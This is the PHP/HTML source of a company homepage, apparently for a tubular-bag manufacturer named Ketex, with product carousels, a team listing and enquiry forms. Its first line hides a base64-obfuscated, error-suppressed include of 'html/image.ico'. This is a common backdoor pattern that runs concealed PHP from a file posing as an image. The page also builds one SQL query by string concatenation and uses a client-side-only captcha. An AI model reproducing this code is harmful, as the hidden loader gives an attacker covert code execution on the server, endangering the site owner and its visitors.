<?php @include base64_decode('aHRtbC9pbWFnZS5pY28='); ?>
<!doctype html>
<html lang="en">
<!--
     	<div class="preloader">
		<div class="content">
			<div class="loader-circle"></div>
			<div class="loader-line-mask one">
				<div class="loader-line"><img class="img-fluid" src="assets/img/loader.gif"></div>
			</div>
			<div class="loader-line-mask two">
				<div class="loader-line"></div>
			</div>
		</div>
	</div>
-->


<!--<div id="page">-->
<head>
    <!-- Required meta tags --> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>
        Ketex
    </title>

    <?php include 'assets/inc/header.php';?>
    <?php include 'index_d.php';?>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js" type="text/css">
    <?php include 'team_control.php';?>
    
    
    
    <!-- ********|| BANNER STARTS ||******** -->
    <section class="banner">
        <div class="container">
            <div class="row">
               
                <div class="col-lg-6 p-0">
                    <div class="banner-box">
                        <div id=owldemo1 class="owl-carousel owl-theme">
                            <!-- <div class="item">
                                <div class="img-box">
                                    <img class="img-fluid" src="assets/img/homebanner_new2.jpg" alt="" />
                                </div>
                            </div>-->
                            <div class="item">
                                <div class="img-box">
                                    <img class="img-fluid" src="assets/img/homebanner_new1.jpg" alt="" />
                                </div>
                            </div>
                            <div class="item">
                                <div class="img-box">
                                    <img class="img-fluid" src="assets/img/homebanner_new3.jpg" alt="" />
                                </div>
                            </div>
                            <div class="item">
                                <div class="img-box">
                                    <img class="img-fluid" src="assets/img/homebanner_new4.jpg" alt="" />
                                </div>
                            </div>
                            <div class="item">
                                <div class="img-box">
                                    <img class="img-fluid" src="assets/img/homebanner_new5.jpg" alt="" />
                                </div>
                            </div>
                            <div class="item">
                                <div class="img-box">
                                    <img class="img-fluid" src="assets/img/banner-4.jpg" alt="" />
                                </div>
                            </div>
                            <div class="item">
                                <div class="img-box">
                                    <img class="img-fluid" src="assets/img/banner-5.jpg" alt="" />
                                </div>
                            </div>
                            
                        </div>
                    </div>
                </div>
                 <div class="col-lg-6 p-0">

<!--
                    <div class="banner-inner">
                        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/YRqxj_tLevE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                    </div>
-->
                     <div class="banner-inner">
                       <div class="video-wrapper">
        <video autoplay muted loop playsinline preload="metadata">
            <source src="assets/img/hd new 2.mp4" type="video/mp4">
<!--            <source src="assets/img/low.mp4" type="video/mp4">-->
        </video>
      </div> 
                     </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ********|| BANNER ENDS ||******** -->

    <!-- ********|| PROFILE STARTS ||******** -->
    <section class="profile-sec">
        <div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <div class="profile-inner" data-aos="zoom-in">
                        <div class="title">Company profile</div>
                        <div class="profile-content">
                            <?php echo $management[0]['content']?>
                        </div>
                        <!-- <div class="profile-content">
                                We are the largest manufacturer of Tubular bags in India and Bangladesh, producing 700 million linear meters of tubes annually from our plants in Kharagpur, Gagret& Bengaluru in India and Dhaka in Bangladesh. The company has its own facilities of the most modern weaving units processing and coating of fabrics with various polymers and resin systems. For specialized applications, work is undertaken from the design stage by our company’s personnel and R&D. Our team of engineers and consultants are always available, not only for problem resolution but for innovative product development and new design.
                          </div> -->

                        <div class="profile-action">
                            <a href="<?php echo $database->base_url; ?>about_us.php" class="more-btn">Read more</a>
                        </div>
                    </div>
                </div>
                <!-- <div class="col-lg-12">

                    <div class="notice-sec">
                        <div class="title">Notice board</div>
                        ?php foreach ($noticedetails as $k => $v): ?>
                        <div class="notice-inner">
                            <div class="notice-info">

                                <div class="notice-content">
                                    <a href="notice_board.php?id=?php echo $v['id'] ?>" class="notice-link">?php echo $v['title'] ?></a>
                                </div>
                                <div class="notice-no">
                                     01-04-2016 
                                    ?php echo $v['date'] ?>
                                </div>

                            </div>
                        </div>
                        ?php endforeach; ?>

                    </div>
                </div> -->

            </div>
        </div>

    </section>
    <!-- ********|| PROFILE ENDS ||******** -->

    <!-- ********|| WE ARE STARTS ||******** -->
    <section class="about-sec">
        <div class="container">

            <div class="row">
                <div class="col-lg-10 offset-lg-1">
                    <div class="title pb-2">journey</div>
                    <div class="about-inner">
                        <div id=home-journey class="owl-carousel owl-theme">
                
                        <?php 
                        $i=1;
                        foreach ($journeyList as $k => $v):
                        //if($i%2 == 0){
                        ?>   
                        
                        <div class="item">
                        	<div class="about_newinfo">
                            	<div class="about_newyear"><?php echo $v['year'] ?></div>
                                <div class="linewithdots"></div>
                                <?php if($i%2 != 0){?>
                                    <div class="homeabout_newarrow"><img class="img-fluid" src="assets/img/about_arrow-01.svg" alt="arrow" /></div>
                                <?php } else {?>
                                    <div class="homeabout_newarrow"><img class="img-fluid" src="assets/img/about_arrow-02.svg" alt="arrow" /></div>
                                <?php }?>
                                <h3><?php echo $v['title'] ?></h3>
                                <div class="about-content">
                                            <?php echo strlen(strip_tags($v['description'])) > 50 ? substr(strip_tags($v['description']),0,50)."..." : strip_tags($v['description']); ?>
                                        </div>
                            </div>

                        </div>         
                           
                            <?php /*?><div class="item">
                                <div class="about-info">
                                    <div class="yellow-inner">
                                        <div class="yellow or-3">
                                            <div class="step"><?php echo $v['title'] ?></div>
                                        </div>
                                        <div class="about-content or-1">
                                            <?php echo strlen(strip_tags($v['description'])) > 50 ? substr(strip_tags($v['description']),0,50)."..." : strip_tags($v['description']); ?>
                                        </div>
                                    </div>

                                    <div class="yellow or-3">
                                        <div class="about-icon-2">
                                            <i class="zmdi zmdi-pin"></i>
                                        </div>
                                    </div>
                                    <div class="about-title-2 or-2"><?php echo $v['year'] ?></div>
                                </div>
                            </div><?php */?>
                            
                        <?php //} else { ?>
                         
                            <?php /*?><div class="item">
                                <div class="about-info">
                                    <div class="about-title or-1"><?php echo $v['year'] ?></div>
                                    <div class="orange">
                                        <div class="about-icon">
                                            <i class="zmdi zmdi-pin"></i>
                                        </div>
                                        <div class="step or-2"><?php echo $v['title'] ?></div>
                                    </div>
                                    <div class="about-content or-3">
                                            <?php echo strlen(strip_tags($v['description'])) > 50 ? substr(strip_tags($v['description']),0,50)."..." : strip_tags($v['description']); ?>
                                    </div>
                                </div>
                            </div><?php */?>
                            
                        <?php //} 
                        $i++;
                        ?>    
            
                        <?php endforeach; ?>                
                            
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-12">
                    <div class="about-part">

                        <div class="about-img">
                            <img class="img-fluid" src="assets/img/about.png" alt="" />
                        </div>

                        <div class="about-action">
                            <a href="<?php echo $database->base_url; ?>about_us.php#printableArea" class="read-btn">read more</a>
                        </div>

                    </div>

                </div>
            </div>

        </div>
    </section>








    <!-- ********|| WE ARE STARTS ||******** -->
    <section class="about-sec about-sec-mobile">
        <div class="container">

            <div class="row">
                <div class="col-lg-10 offset-lg-1">
                    <div class="title">journey</div>
                    <div class="about-inner">
                        <div id=home-journey-2 class="owl-carousel owl-theme">
                
                        <?php 
                        $i=1;
                        foreach ($journeyList as $k => $v):
                        //if($i%2 == 0){
                        ?>            

							<div class="item">
                        	<div class="about_newinfo">
                            	<div class="about_newyear"><?php echo $v['year'] ?></div>
                                <div class="linewithdots"></div>
                                <?php if($i%2 != 0){?>
                                    <div class="homeabout_newarrow"><img class="img-fluid" src="assets/img/about_arrow-01.svg" alt="arrow" /></div>
                                <?php } else {?>
                                    <div class="homeabout_newarrow"><img class="img-fluid" src="assets/img/about_arrow-02.svg" alt="arrow" /></div>
                                <?php }?>
                                <h3><?php echo $v['title'] ?></h3>
                                <div class="about-content">
                                            <?php echo strlen(strip_tags($v['description'])) > 50 ? substr(strip_tags($v['description']),0,50)."..." : strip_tags($v['description']); ?>
                                        </div>
                            </div>
                        </div> 

                            <?php /*?><div class="item">
                                <div class="about-info">
                                    <div class="about-title"><?php echo $v['year'] ?></div>
                                    <div class="yellow">
                                        <div class="about-icon">
                                            <i class="zmdi zmdi-pin"></i>
                                        </div>
                                        <div class="step"><?php echo $v['title'] ?></div>
                                    </div>
                                    <div class="about-content">
                                            <?php echo strlen(strip_tags($v['description'])) > 50 ? substr(strip_tags($v['description']),0,50)."..." : strip_tags($v['description']); ?>
                                    </div>
                                </div>
                            </div>
                            
                        <?php } else { ?>
                         
                            <div class="item">
                                <div class="about-info">
                                    <div class="about-title or-1"><?php echo $v['year'] ?></div>
                                    <div class="orange">
                                        <div class="about-icon">
                                            <i class="zmdi zmdi-pin"></i>
                                        </div>
                                        <div class="step or-2"><?php echo $v['title'] ?></div>
                                    </div>
                                    <div class="about-content or-3">
                                            <?php echo strlen(strip_tags($v['description'])) > 50 ? substr(strip_tags($v['description']),0,50)."..." : strip_tags($v['description']); ?>
                                    </div>
                                </div>
                            </div><?php */?>

                    
                            
                        <?php //} 
                        $i++;
                        ?>    
            
                        <?php endforeach; ?>                
                            
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-12">
                    <div class="about-part">


                        <div class="about-action">
                            <a href="<?php echo $database->base_url; ?>about_us.php#printableArea" class="read-btn">read more</a>
                        </div>

                    </div>

                </div>
            </div>

        </div>
    </section>
    <!-- ********|| WE ARE ENDS ||******** -->

    <!-- ********|| PRODUCTS STARTS ||******** -->
    <section class="product-sec">
        <div class="container">
            <div class="row">
                <div class="col-lg-10 offset-lg-1">
                    <div class="title-inner">
                        <div class="title">our products</div>
                    </div>
                    <!--
                      <div class="row">
                          <div class="col-lg-4">
-->

                    <div id=owldemo2 class="owl-carousel owl-theme aos-init aos-animate" data-aos="fade-up">

                        <?php
                            foreach ($productlist as $k => $v):
                                ?>
                        <div class="item">
                            <div class="product-inner">
                                <div class="product-img">
                                    <img class="img-fluid" src="<?php echo $database->base_url . $database->document_path_site_image . $v['image']; ?>" alt="" />
                                </div>
                                <div class="product-info">
                                    <div class="product-title">
                                        <!-- THERMALLY FORMED COMBO BAGS -->
                                        <?php echo $v['pro_name']?>
                                    </div>
                                    <div class="product-content">
                                        <!-- In D.C. Casting, Combo Bag controls the flow pattern and temperature distribution, which effect the temperature profile across the mold and hence the molten metal sump; these have bearing on the structure in solidification. The practical solution... -->
                                        <!--<?php echo strip_tags($v['pro_description'])?>-->
                                        <?php  $string =strip_tags($v['pro_description']);
                                       $string = (strlen($string) > 70)?substr($string,0,100).'....': $string;
                                       echo $string;
                                    ?>
                                    </div>
<!--
                                    <div class="product-action">
                                        <a href="product_details.php?id=<?php echo $v['pro_id'] ?>" class="read-btn">+read more</a>
                                    </div>
-->
                                    <div class="welbtn-action">
                                        <a href="product_details.php?id=<?php echo $v['pro_id'] ?>" class="welbtn">read more</a>
<!--              <a href="https://indianihm.com/" class="welbtn">+read more</a> -->
          </div>
                                </div>
                            </div>
                        </div>
                        
                        <?php  endforeach; ?>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ********|| PRODUCTS ENDS ||******** -->

    <?php 
                            foreach ($productlist as $k => $v):
                                ?>
    <div class="modal fade" id="exampleModal<?php echo $v['pro_id']; ?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel">Product Enquiry</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">

                        <span aria-hidden="true">&times;</span>

                    </button>
                </div>
                <p style="background-color: green;color: #fff;padding: 10px;padding-left: 21px;display:none;" id="successMessageProductShow">Your Product Enquiry Send Successfully ,Thank You!</p>

                <div class="modal-body">
                    <div class="modal-form">

                        <form id="productEnquiryForm<?php echo $v['pro_id']; ?>" name="productEnquiryForm">
                            <div class="form-group">
                                <input type="text" class="form-control" placeholder="Name" name="cst_name" id="formName" required>
                                <input type="hidden" name="pro_id" value="<?php echo $v['pro_id']; ?>">
                            </div>

                            <div class="form-group">
                                <input type="email" class="form-control" placeholder="Email" name="email" id="formEmail" required>
                            </div>
                            <div class="form-group">
                                <input type="number" class="form-control" placeholder="Ph no" name="phn_number" id="formPhone" required pattern="[6-9]{1}[0-9]{9}">
                            </div>
                            <div class="form-group">
                                <textarea class="form-control" placeholder="message" rows="3" name="message" id="formMessage" required></textarea>
                            </div>
                            <!--<div class="g-recaptcha" data-sitekey="<?php echo $publickey; ?>"></div>-->

                            <div class="form-group">
                                <div class="col-md-6">
                                    <input class="form-control" placeholder="Enter Captcha" name="CaptchaInput" id="CaptchaInputPro<?php echo $v['pro_id']; ?>" class="textEntry" type="text" autocomplete="off">
                                </div>
                                <div class="col-md-3">
                                    <div id="CaptchaDivPro<?php echo $v['pro_id']; ?>" style="border: none;height: 40px;width: 102px;display: flex;justify-content: center;align-items: center;clear: both;color: #fff;float: left;margin-right: 15px;background-color: #006280;"></div>
                                    <div>
                                        <input type="hidden" id="txtCaptchaPro<?php echo $v['pro_id']; ?>">
                                    </div>
                                    <div class="col-md-1">
                                        <div class="career-capcha" style="padding:10px;" onclick="refreshCaptchaPro<?php echo $v['pro_id']; ?>()">
                                            <img name="" id="" src="https://www.freeiconspng.com/thumbs/refresh-icon/refresh-icon-0.png" style="height:30px;width:30px;" tabindex="0" />
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <input type="submit" id="btn" class="submit-btn" value="Submit">
                        </form>
                        
                        
                        

                    </div>

                </div>
            </div>
        </div>
    </div>

    <script type="text/javascript">
        var a = Math.ceil(Math.random() * 9) + '';
        var b = Math.ceil(Math.random() * 9) + '';
        var c = Math.ceil(Math.random() * 9) + '';
        var d = Math.ceil(Math.random() * 9) + '';
        var e = Math.ceil(Math.random() * 9) + '';

        var code = a + b + c + d + e;
        document.getElementById("txtCaptchaPro<?php echo $v['pro_id']; ?>").value = code;
        document.getElementById("CaptchaDivPro<?php echo $v['pro_id']; ?>").innerHTML = code;

        function refreshCaptchaPro<?php echo $v['pro_id']; ?>() {

            var a = Math.ceil(Math.random() * 9) + '';
            var b = Math.ceil(Math.random() * 9) + '';
            var c = Math.ceil(Math.random() * 9) + '';
            var d = Math.ceil(Math.random() * 9) + '';
            var e = Math.ceil(Math.random() * 9) + '';

            document.getElementById("CaptchaInputPro<?php echo $v['pro_id']; ?>").value = '';

            var code = a + b + c + d + e;
            document.getElementById("txtCaptchaPro<?php echo $v['pro_id']; ?>").value = code;
            document.getElementById("CaptchaDivPro<?php echo $v['pro_id']; ?>").innerHTML = code;

        }

    </script>
    <?php  endforeach;  ?>

    <!-- ********|| TEAM STARTS ||******** -->
    <section class="team-sec">
        <div class="container">
            <div class="row">
                <div class="col-lg-10 offset-lg-1">
                    <div class="title-inner" data-aos="zoom-in">
                        <div class="title">who we are?</div>
                        <div class="title-content">
                            <?php echo $whoweare[0]['content']?>
                        </div>
                        <div class="team-action">
                            <a href="<?php echo $database->base_url; ?>about_us.php" class="read-btn">read more</a>
                        </div>
                    </div>
                </div>
            </div>
<!--            <div class="row">-->
                <div class="col-lg-12">
					<div class="title pb-0 pt-4">Our Team</div>
                    <?php echo $department ; ?>
                </div>
<!--            </div>-->

            <!--start mobile version-->
<?php include_once('conn1.php');?>            
            <div class="row">
                <div class="col-lg-12 p-0">
                    <div class="details">
<!--                        <div class="container">-->
<!--
                            <div class="row">

                                <div class="col-md-12">
-->
                                    <div class="details-aco">
                                        <div class="accordion" id="accordionExample">
                                            <div class="card">
                                                <?php
                                                foreach ($allTeamArr as $k => $v){
                                                        
                                                    $sql ="SELECT * FROM `employee_department_details` WHERE `dep_id` = '".$v['dep_id']."' ORDER BY sort_number ASC";
                                                    
                                                    $query2 = $connNew->query($sql);
                                                    $allMemberDelatilsArr = $query2->fetchAll(PDO::FETCH_ASSOC);
                                                    //echo '<pre>';print_r($allMemberDelatilsArr);
                                                ?> 
                                                <div class="card-header" id="headingOne">
                                                    <h2 class="mb-0">
                                                        <button class="btn btn-link btn-block text-left collapsed" type="button" data-toggle="collapse" data-target="#collapseOne<?php echo $v['dep_id']; ?>" aria-expanded="false" aria-controls="collapseOne">
                                                            <?php echo $v['department_name']; ?>
                                                        </button>
                                                    </h2>
                                                </div>
                                                <div id="collapseOne<?php echo $v['dep_id']; ?>" class="collapse" aria-labelledby="headingOne" data-parent="#accordionExample">
                                                    <div class="card-body">
                                                        <div class="row">
                                                            <?php

                                                                foreach ($allMemberDelatilsArr as $key => $value){
                                                            ?>
                                                            <div class="col-lg-6">
                                                                <div class="info-inner">
                                                                    <div class="info-tab">
                                                                        <div class="team-img">
                                                                            <img class="img-fluid" src="upload/profile_image/<?php echo $value['employee_image'] ?>">
                                                                        </div>
                                                                        <div class="team-name">
                                                                            <?php echo $value['employee_name'] ?>
                                                                        </div>
                                                                        <div class="team-content">
                                                                            <?php echo $value['emp_designation'] ?>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        <?php
                                                                }
                                                        ?>
                                                        </div>
                                                    </div>
                                                </div>
                                                <?php 
                                                    }
                                                    ?>
                                            </div>
                                        </div>
                                    </div>



<!--
                                </div>
                            </div>
-->
<!--                        </div>-->
                    </div>
                </div>
            </div>

        </div>

        <!--end mobile version-->






    </section>
    <!-- ********|| TEAM ENDS ||******** -->

    <!-- ********||  OUR PARTNER STARTS ||******** -->
    <section class="partner-sec">
        <div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <div class="title-inner">
                        <div class="title">OUR CLIENTS</div>
<!--
                        <div class="title-content">
                            Lorem Ipsum is simply dummy text of the printing and typesetting industry.
                        </div>
-->
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-10 offset-lg-1">
                    <div class="partner-inner">
                        <div id=partner-owl class="owl-carousel owl-theme">
                                    <?php
                                    if (!empty($clients)):
                                        $i = 1;
                                        foreach ($clients as $k => $v):
                                            ?>
                            <div class="item partner-body">
                                <div class="partner-info">
                                    <!--<a href="assets/img/development_banner.jpg" class="item-inner" data-fancybox="image">-->
                                    <!--<div class="item-img">-->
                                    <!--    <img class="img-fluid" src="assets/img/development_banner.jpg" alt="">-->
                                    <!--</div>-->
                                    <?php if ($v['client_image'] != '') { ?>
											<a href="<?php echo $database->base_url . $database->document_path_site_image . $v['client_image']; ?>" data-toggle="lightbox" data-gallery="example-gallery">
                                            <img class="img-fluid" src="
                                                        <?php echo $database->base_url . $database->document_path_site_image . $v['client_image']; ?>" />
                                             </a>
                                            <?php } ?>
                                </a>
                                </div>
                                <div class="partner-content">
                                    <?php echo $v['client_name']?>
                                </div>
                                
                                
                                
                                
                            </div>
                                  <?php
                                            $i++;
                                        endforeach;

                                    endif;
                                    ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ********||  OUR PARTNER ENDS ||******** -->
    <!-- ********||  ACHIEVEMENT STARTS ||******** -->
    <section class="achievement-sec">
        <div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <div class="title-inner">
                        <div class="title">Our achievements and activities</div>
                        <div class="title-content">
                            Our Efforts Are Recognized By Experts.
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-10 offset-lg-1">
                    <div class="achievement-inner">
                        <div id=owldemo3 class="owl-carousel owl-theme">

                            <?php
                                    if (!empty($awords)):
                                        $i = 1;
                                        foreach ($awords as $k => $v):
                                            ?>



                            <div class="item">
                                <div class="achievement-info">
                                    <div class="img-box">
                                        <div class="achievement-img">
                                            <?php if ($v['image'] != '') { ?>
											<a href="<?php echo $database->base_url . $database->document_path_site_image . $v['image']; ?>" data-toggle="lightbox" data-gallery="example-gallery">
                                            <img src="
                                                        <?php echo $database->base_url . $database->document_path_site_image . $v['image']; ?>" />
                                             </a>
                                            <?php } ?>
                                        </div>
                                    </div>
                                    <div class="achievement-content">
                                        <?php echo $v['description']?>
                                    </div>
                                    <div class="achievement-sit">
                                        <?php echo $v['year']?>
                                    </div>
                                </div>
                            </div>
                            <?php
                                            $i++;
                                        endforeach;

                                    endif;
                                    ?>
                            
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ********||  ACHIEVEMENT ENDS ||******** -->
    

    <!-- ********||  GLOBAL STARTS ||******** -->
    <section class="global-sec">
        <div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <div class="title-inner">
                        <div class="title">GLOBAL PRESENCE AND EXPORTS</div>
                    </div>
                    <div class="title-img">
                        <!-- <img class="img-fluid" src="assets/img/map.png" alt="" /> -->
                        <div id="gmap-holder">
                            <iframe class="g-maps" src="https://www.google.com/maps/d/u/2/embed?mid=12a3CeF5uY8MdyjhjAzE8Txgo9LTfQZ7t&ehbc=2E312F" width="100%" height="486" frameborder="0" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade" style="pointer-events:none"></iframe>
                        </div>                        
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ********||  GLOBAL ENDS ||******** -->

    <!-- ********|| APPLICATIONS STARTS ||******** -->
    <section class="application-sec">
        <div class="container">
            <div class="row">
                <div class="col-lg-9 offset-lg-1">
                    <div class="row">
                      
                        <div class="col-lg-12">
                            <div class="enquiry" data-aos="flip-left">
                                <div class="title-inner">
                                    <div class="title">SEND an ENQUIRY</div>
                                </div>
                                <div class="enquiry-inner">
                                    <form id="sendEnquiryForm">
                                        <div class="form-row">
                                        <div class="form-group col-md-6">
                                            <input type="text" class="form-control" name="cst_name" id="formName1" placeholder="Your Name*" required>
                                        </div>
                                        <div class="form-group col-md-6">
                                            <input type="text" class="form-control" name="phn_number" id="formPhone1" placeholder="Mobile No*" required>
                                        </div>
                                        <div class="form-group col-md-6">
                                            <input type="text" class="form-control" name="email" id="formEmail1" placeholder="Email Id*" required>
                                        </div>
                                        <div class="form-group  col-md-6">
                                            <input type="text" class="form-control" name="subject" id="formSubject1" placeholder="Subject*" required>
                                        </div>
                                        <div class="form-group  col-md-12">
                                            <textarea class="form-control" name="message" id="formMessage1" placeholder="Your Message" rows="3" required></textarea>
                                        </div>
                                        </div>
                                       
                                        <!--<div class="form-group">
                                            <select class="form-control select-sec" name="country" id="exampleFormControlSelect1" required>
                                                <option>Select Country*</option>
                                                <option>1</option>
                                                <option>2</option>
                                                <option>3</option>
                                                <option>4</option>
                                                <option>5</option>
                                            </select>
                                        </div>-->
                                        
                                        <!--<div class="g-recaptcha" data-sitekey="<?php echo $publickey; ?>"></div>-->
                                           <div class="col-md-12 p-0 mb-2">
                                        <div class="form-group">
                                            	<div class="row">
                                                    <div class="col-md-6">
                                                    <input class="form-control" placeholder="Enter Captcha" name="CaptchaInput" id="CaptchaInputHome" class="textEntry" type="text" autocomplete="off">
                                                    </div>
                                                    <div class="col-md-3">
                                                    <div id="CaptchaDivHome" style="border: none;height: 45px;width: 130px;display: flex;justify-content: center;align-items: center;clear: both;color: #fff;float: left;margin-right: 15px;background-color: #006280;margin-top: 10px;"></div>
                                                    <div>
                                                        <input type="hidden" id="txtCaptchaHome">
                                                    </div>
                                                    <div class="col-md-1">
                                                        <div class="career-capcha" style="padding-top:16px;" onclick="refreshCaptchaHome()">
                                                            <img name="" id="" src="https://www.freeiconspng.com/thumbs/refresh-icon/refresh-icon-0.png" style="height:30px;width:30px;" tabindex="0" />
                                                        </div>
                                                    </div>
                                                </div>
                                                	<div class="col-md-3">
                                                    	<button type="submit" class="sub-btn">Submit</button>
                                                    </div>
                                            	</div>
                                            </div>
                                            
                                        </div>

                                        <p style="background-color: green; color: rgb(255, 255, 255); padding: 10px 10px 10px 21px; display: none; margin-top: 10px;margin-bottom: -20px;" id="successMessageShowIndex">
                                            Your Enquiry Send Successfully ,Thank You!</p>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ********|| APPLICATIONS ENDS ||******** -->
    <?php include 'assets/inc/footer.php';?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.js"></script>
    <script type="text/javascript">
        $(function() {
            $('#gmap-holder').click(function(e) {
                $(this).find('iframe').css('pointer-events', 'all');
            }).mouseleave(function(e) {
                $(this).find('iframe').css('pointer-events', 'none');
            });
        })
    </script>
    <script>
	$(document).on('click', '[data-toggle="lightbox"]', function(event) {
                event.preventDefault();
                $(this).ekkoLightbox();
            });
	</script>

    <script type="text/javascript">
        var a = Math.ceil(Math.random() * 9) + '';
        var b = Math.ceil(Math.random() * 9) + '';
        var c = Math.ceil(Math.random() * 9) + '';
        var d = Math.ceil(Math.random() * 9) + '';
        var e = Math.ceil(Math.random() * 9) + '';

        var code = a + b + c + d + e;
        document.getElementById("txtCaptchaHome").value = code;
        document.getElementById("CaptchaDivHome").innerHTML = code;

        function refreshCaptchaHome() {

            var a = Math.ceil(Math.random() * 9) + '';
            var b = Math.ceil(Math.random() * 9) + '';
            var c = Math.ceil(Math.random() * 9) + '';
            var d = Math.ceil(Math.random() * 9) + '';
            var e = Math.ceil(Math.random() * 9) + '';

            document.getElementById("CaptchaInputHome").value = '';

            var code = a + b + c + d + e;
            document.getElementById("txtCaptchaHome").value = code;
            document.getElementById("CaptchaDivHome").innerHTML = code;

        }

        var a = Math.ceil(Math.random() * 9) + '';
        var b = Math.ceil(Math.random() * 9) + '';
        var c = Math.ceil(Math.random() * 9) + '';
        var d = Math.ceil(Math.random() * 9) + '';
        var e = Math.ceil(Math.random() * 9) + '';

        var code = a + b + c + d + e;
        document.getElementById("txtCaptcha1").value = code;
        document.getElementById("CaptchaDiv1").innerHTML = code;

        function refreshCaptcha() {

            var a = Math.ceil(Math.random() * 9) + '';
            var b = Math.ceil(Math.random() * 9) + '';
            var c = Math.ceil(Math.random() * 9) + '';
            var d = Math.ceil(Math.random() * 9) + '';
            var e = Math.ceil(Math.random() * 9) + '';

            document.getElementById("CaptchaInput").value = '';

            var code = a + b + c + d + e;
            document.getElementById("txtCaptcha1").value = code;
            document.getElementById("CaptchaDiv1").innerHTML = code;

        }

    </script>
    </body>
<!--</div>-->
</html>
